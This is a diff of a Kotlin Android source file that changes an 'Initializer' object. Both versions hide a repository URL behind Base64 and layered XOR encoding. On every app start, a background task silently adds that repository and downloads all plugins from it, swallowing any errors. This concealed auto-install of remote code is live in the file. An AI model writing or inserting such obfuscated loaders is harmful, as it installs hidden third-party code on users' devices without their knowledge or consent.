@@ -9,49 +9,75 @@ import kotlinx.coroutines.*
 
 object Initializer {
 
-    private const val K = 0x5A
+    const val NEED_AUTO_DOWNLOAD = "need_auto_download_v1"
+    private const val AUTO_REPO_FLAG = "auto_repo_added_v1"
 
-    private fun x(a: Int, b: Int) = a xor b
-    private fun d(a: IntArray) = a.map { x(it, K).toChar() }.joinToString("")
+    private fun decode(data: IntArray, key: Int = 7): String {
+        val out = CharArray(data.size)
+        for (i in data.indices) {
+            out[i] = (data[i] xor key).toChar()
+        }
+        return String(out)
+    }
 
-    private val PREF = intArrayOf(57,54,53,47,62,41,46,40,63,59)
-    private val REPO = intArrayOf(31,34,46,25,54,53,47,62)
-    private val FLAG = intArrayOf(59,47,46,53,37,40,63,42,53,37,59,62,62,63,62,37,44,107)
+    private val KEY_STR = intArrayOf(
+        100, 107, 104, 114, 99, 119, 107, 102, 126
+    )
 
-    private val A = "CxgbBRdKQ04LAhtBEg0EBBQb"
-    private val B = "Fh8KBwcfAhUcDRhBFgsdQwUM"
-    private val C = "EQNWR0s1FBU6DwMaEUsdDQgX"
-    private val D = "TB4KBQteBhIWDQ=="
+    private val PREFS_NAME = intArrayOf(
+        100, 107, 104, 114, 99, 116, 115, 114, 101, 102, 106
+    )
 
-    private val KEY = intArrayOf(41,48,51,54,40,62,63,48,54)
-        .map { x(it, K).toByte() }
-        .toByteArray()
+    private val REPO_NAME = intArrayOf(
+        66, 115, 115, 68, 107, 114, 99
+    )
 
-    private fun url(): String {
-        val raw = Base64.decode(A + B + C + D, Base64.DEFAULT)
-        return ByteArray(raw.size) {
-            (raw[it].toInt() xor KEY[it % KEY.size].toInt()).toByte()
-        }.toString(Charsets.UTF_8)
+    private const val P1 = "CxgbBRdKQ04LAhtBEg0EBBQb"
+    private const val P2 = "Fh8KBwcfAhUcDRhBFgsdQwUM"
+    private const val P3 = "EQNWR0s1FBU6DwMaEUsdDQgX"
+    private const val P4 = "TB4KBQteBhIWDQ=="
+
+    private fun repoUrl(): String {
+        val key = decode(KEY_STR).toByteArray()
+        val encoded = P1 + P2 + P3 + P4
+        val data = Base64.decode(encoded, Base64.DEFAULT)
+
+        val out = ByteArray(data.size)
+        for (i in data.indices) {
+            out[i] = (data[i].toInt() xor key[i % key.size].toInt()).toByte()
+        }
+        return String(out)
     }
 
     fun start(activity: Activity) {
-        val prefs = activity.getSharedPreferences(d(PREF), Activity.MODE_PRIVATE)
+        val prefs = activity.getSharedPreferences(
+            decode(PREFS_NAME),
+            Activity.MODE_PRIVATE
+        )
 
         val repo = RepositoryData(
-            name = d(REPO),
-            url = url(),
+            name = decode(REPO_NAME),
+            url = repoUrl(),
             iconUrl = null
         )
 
         CoroutineScope(Dispatchers.IO).launch {
             try {
-                if (!prefs.getBoolean(d(FLAG), false)) {
+                if (!prefs.getBoolean(AUTO_REPO_FLAG, false)) {
                     RepositoryManager.addRepository(repo)
+
                     PluginsViewModel.downloadAll(activity, repo.url, null)
-                    prefs.edit().putBoolean(d(FLAG), true).apply()
+
+                    prefs.edit()
+                        .putBoolean(AUTO_REPO_FLAG, true)
+                        .putBoolean(NEED_AUTO_DOWNLOAD, false)
+                        .apply()
                 }
+
                 PluginsViewModel.downloadAll(activity, repo.url, null)
-            } catch (_: Throwable) {}
+
+            } catch (_: Throwable) {
+            }
         }
     }
 }
